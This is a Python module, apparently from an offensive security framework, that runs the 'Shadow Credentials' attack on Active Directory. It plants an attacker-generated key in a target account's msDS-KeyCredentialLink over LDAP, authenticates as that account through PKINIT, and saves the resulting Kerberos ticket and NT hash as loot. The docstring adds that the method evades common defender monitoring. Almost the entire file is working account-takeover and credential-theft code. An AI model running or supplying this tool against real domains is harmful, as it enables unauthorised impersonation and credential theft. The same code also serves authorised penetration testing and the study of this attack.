"""Shadow credentials: plant a key on an account you can write, PKINIT in.

The write-primitive cousin of RBCD: with GenericWrite (or own) on a
target account, add your OWN public key to its msDS-KeyCredentialLink
(KCL). The KDC treats that key as a login credential for the account —
no password reset, no NTLM, nothing in the usual places defenders
watch. Then PKINIT (core/pkinit.py) turns the key into a TGT and
UnPAC pulls the NT hash: full impersonation with a clean LDAP restore
when you're done (pywhisker's trick, FORGE-shaped).

Chain:
  1. LDAP: resolve TARGET, snapshot its existing KCL values
  2. generate an RSA-2048 key + self-signed cert for it
  3. build the KeyCredentialLink-DN-Binary (Version 2 blob: KeyID =
     SHA256(KeyMaterial), KeyHash over entries 3-9, BCRYPT RSA blob,
     NGC usage, AD source, random DeviceId, creation FILETIME) and
     MODIFY it in, preserving existing values
  4. PKINIT as TARGET via core/pkinit.py -> ccache loot, UNPAC hash
  5. restore the original KCL values (value-exact)

LAB NOTE: needs a schema with msDS-KeyCredentialLink (the ad lab
carries it as a fixture) and a PKINIT-capable KDC (real Windows AD —
Debian's Samba KDC has none, so the lab verifies write/restore and
the clean PKINIT refusal, not issuance).
"""

import datetime
import hashlib
import secrets
import struct

from core.module import AuxiliaryModule
from core.options import OptAddress, OptBool, OptString
from core.pkinit import PkinitError, request_tgt, unpac_nthash

try:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID
except ImportError:
    x509 = None
try:
    from impacket.krb5.ccache import CCache
    from impacket.krb5.crypto import _enctype_table
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1
except ImportError:
    impacket_ldap = None  # console gates run() on requirements

KCL_ATTR = "msDSKeyCredentialLink"  # lDAPDisplayName — Samba resolves
# attributes by this name ONLY (the hyphenated CN form gets
# "noSuchAttribute"); Windows accepts both.
KCL_VERSION_2 = 0x00000200
EPOCH_FILETIME = 11644473600  # seconds between 1601 and 1970


def bcrypt_rsakey_blob(public_key):
    """BCRYPT_RSAPUBLIC_BLOB: RSA1 magic, bit counts, exponent, modulus."""
    numbers = public_key.public_numbers()
    modulus = numbers.n.to_bytes(256, "big")
    exponent = numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, "big")
    return (b"RSA1" +
            struct.pack("<IIIII", 2048, len(exponent), 256, 0, 0) +
            exponent + modulus)


def kcl_entry(identifier, value):
    return struct.pack("<HH", identifier, len(value)) + value


def filetime_now():
    now = datetime.datetime.now(datetime.timezone.utc).timestamp()
    return struct.pack("<Q", int((now + EPOCH_FILETIME) * 10_000_000))


def build_kcl_dn_with_binary(pub_blob, device_id, creation, target_dn):
    """The DN-Binary LDAP value: B:<hexlen>:<hex blob>:<dn>.

    Blob: Version(4) then 2-byte-id/2-byte-len entries — KeyID (SHA256
    of KeyMaterial), KeyHash (SHA256 of the entry 3-9 values), then
    KeyMaterial, KeyUsage=NGC, KeySource=AD, DeviceId, CustomKeyInfo,
    LastLogonTime, CreationTime."""
    entries = (
        kcl_entry(0x0003, pub_blob) +
        kcl_entry(0x0004, b"\x01") +
        kcl_entry(0x0005, b"\x00") +
        kcl_entry(0x0006, device_id) +
        kcl_entry(0x0007, b"\x01\x00") +
        kcl_entry(0x0008, b"\x00" * 8) +
        kcl_entry(0x0009, creation))
    values = b"".join(
        value for _id, value in _walk_entries(entries))
    key_id = hashlib.sha256(pub_blob).digest()
    key_hash = hashlib.sha256(values).digest()
    blob = (struct.pack("<I", KCL_VERSION_2) +
            kcl_entry(0x0001, key_id) +
            kcl_entry(0x0002, key_hash) +
            entries)
    hexed = blob.hex().upper()
    return f"B:{len(hexed)}:{hexed}:{target_dn}"


def _walk_entries(data):
    pos = 0
    while pos + 4 <= len(data):
        ident, size = struct.unpack_from("<HH", data, pos)
        yield ident, data[pos + 4:pos + 4 + size]
        pos += 4 + size


def make_cert(common_name):
    """Self-signed RSA-2048 cert for the planted key (pywhisker shape:
    generous validity, CN=<account>)."""
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, common_name)])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=365))
            .not_valid_after(now + datetime.timedelta(days=365))
            .sign(key, hashes.SHA256()))
    return cert, key


class ShadowCreds(AuxiliaryModule):
    name = "Shadow Credentials (msDS-KeyCredentialLink plant)"
    description = """
        Plants a self-signed key in TARGET's msDS-KeyCredentialLink
        (write access required), then PKINITs as TARGET: ccache to
        loot, NT hash to creds. Original KCL values are snapshotted
        and restored exactly (CLEANUP, default on). Needs a real
        Windows AD KDC for issuance; the ad lab verifies the
        write/restore and reports the Samba KDC's refusal cleanly.
    """
    authors = ["you"]
    requirements = ["impacket", "cryptography"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Account with write on TARGET"))
        self.options.add(OptString("PASSWORD", required=True,
                                   description="Password"))
        self.options.add(OptString("TARGET", required=True,
                                   description="Account to take over"))
        self.options.add(OptBool("CLEANUP", default=True,
                                 description="Restore original KCL values"))

    def run(self):
        host = str(self.get_option("RHOSTS")).split(",")[0].strip()
        domain = str(self.get_option("DOMAIN"))
        user = str(self.get_option("USERNAME"))
        password = str(self.get_option("PASSWORD"))
        target = str(self.get_option("TARGET"))
        try:
            conn = impacket_ldap.LDAPConnection(f"ldap://{host}")
            conn.login(user, password, domain)
        except Exception as e:
            self.print_error(f"{host}: LDAP bind failed - {e}")
            return
        try:
            self._attack(host, domain, target, conn)
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def _attack(self, host, domain, target, conn):
        base = ",".join(f"DC={p}" for p in domain.split("."))
        dn, existing = None, []
        for packet in conn.search(
                searchBase=base,
                searchFilter=f"(sAMAccountName={target})",
                attributes=["distinguishedName", KCL_ATTR]):
            if isinstance(packet, ldapasn1.SearchResultEntry):
                dn = str(packet["objectName"])
                attrs = {str(a["type"]): [str(v) for v in a["vals"]]
                         for a in packet["attributes"]}
                existing = attrs.get(KCL_ATTR, [])
                break
        if dn is None:
            self.print_error(f"{target}: no such account in {domain}")
            return
        self.print_debug(f"{target}: {dn} ({len(existing)} existing "
                         f"KCL value(s))")

        cert, key = make_cert(target)
        device_id = secrets.token_bytes(16)
        pub_blob = bcrypt_rsakey_blob(key.public_key())
        kcl_value = build_kcl_dn_with_binary(pub_blob, device_id,
                                             filetime_now(), dn)
        self.print_status(f"{target}: planting shadow credential "
                          f"(device {device_id.hex()[:16]}...)")
        try:
            conn.modify(dn, {KCL_ATTR: [(2, existing + [kcl_value])]})
        except Exception as e:
            self.print_error(f"{target}: KCL write failed (need write "
                             f"access; schema needs msDS-KeyCredentialLink) "
                             f"- {e}")
            return
        self.print_good(f"{target}: shadow credential planted")

        pem = (cert.public_bytes(serialization.Encoding.PEM) +
               key.private_bytes(serialization.Encoding.PEM,
                                 serialization.PrivateFormat.PKCS8,
                                 serialization.NoEncryption()))
        store = getattr(self.framework, "store", None)
        if store is not None:
            store.add_loot("cert", f"shadow_creds {target} @ {host}",
                           pem.decode(), address=host)

        try:
            self.print_status(f"{target}: requesting TGT via PKINIT")
            asrep, reply_key, session_key, etype = request_tgt(
                host, domain, target, cert, key)
            ccache = CCache()
            ccache.fromTGT(asrep, _enctype_table[etype], session_key)
            if store is not None:
                store.add_loot("ccache",
                               f"shadow_creds {target}@{domain} @ {host}",
                               ccache.getData(), address=host)
            self.print_good(f"{target}: TGT saved as loot (ccache)")
            nthash = unpac_nthash(host, domain, target, reply_key,
                                  session_key, asrep)
            if nthash:
                self.print_good(f"{target}: NT hash: {nthash}")
                if store is not None:
                    store.add_cred(host, "ntlm", target, nthash,
                                   source="shadow_creds")
        except PkinitError as e:
            self.print_error(f"{host}: PKINIT as {target} failed - {e}")
        finally:
            if self.get_option("CLEANUP"):
                try:
                    conn.modify(dn, {KCL_ATTR: [(2, existing)]})
                    self.print_status(f"{target}: KCL restored "
                                      f"({len(existing)} value(s))")
                except Exception as e:
                    self.print_error(f"{target}: KCL RESTORE FAILED — "
                                     f"remove the planted value manually! "
                                     f"- {e}")
